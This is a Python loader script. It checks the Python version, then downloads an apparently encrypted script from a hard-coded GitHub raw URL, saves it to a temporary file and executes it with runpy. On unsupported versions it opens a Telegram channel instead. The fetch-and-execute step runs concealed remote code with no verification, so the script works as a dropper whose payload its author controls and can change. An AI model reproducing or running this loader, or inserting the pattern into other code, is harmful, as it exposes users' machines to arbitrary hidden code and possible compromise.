import sys
import requests
import webbrowser
import pyfiglet
import tempfile
import runpy
from rich.console import Console

console = Console()

version_tuple = (sys.version_info.major, sys.version_info.minor)
version_str = f"{version_tuple[0]}.{version_tuple[1]}"

ALLOWED_VERSIONS = [(3, 11), (3, 12), (3, 13)]

TELEGRAM_LINK = "https://t.me/requirementspy"


GITHUB_LINKS = {
    (3, 11): "https://raw.githubusercontent.com/baahnm/Somaniexe/refs/heads/main/sundari_3.11_enc.py",
    (3, 12): "https://raw.githubusercontent.com/baahnm/Somaniexe/refs/heads/main/sundari_3.12_enc.py",
    (3, 13): "https://raw.githubusercontent.com/baahnm/Somaniexe/refs/heads/main/sundari_3.13_enc.py",
}

def main():
    if version_tuple in ALLOWED_VERSIONS:

        console.print(f"🔹 Your Python version: [bold green]{version_str}[/bold green]")
        console.print("[bold green]✅ Compatible version! Loading script...[/bold green]")

        url = GITHUB_LINKS[version_tuple]

        try:
            response = requests.get(url, timeout=15)
            if response.status_code != 200 or not response.text.strip():
                raise Exception("GitHub file not found or empty")

            with tempfile.NamedTemporaryFile(
                delete=False, suffix=".py"
            ) as temp_file:
                temp_file.write(response.text.encode("utf-8"))
                temp_path = temp_file.name

            runpy.run_path(temp_path, run_name="__main__")

        except Exception as e:
            console.print(f"[bold red]❌ Failed to load script:[/bold red] {e}")

    else:
        ascii_art = pyfiglet.figlet_format(
            "        ERROR\n USE PYTHON 3.11 - 3.13"
        )
        console.print(f"[bold red]{ascii_art}[/bold red]")

        console.print(
            "[bold yellow]⚠️ Unsupported Python version[/bold yellow]"
        )

        try:
            webbrowser.open(TELEGRAM_LINK)
        except Exception:
            console.print(f"[bold red]Open manually:[/bold red] {TELEGRAM_LINK}")

if __name__ == "__main__":
    main()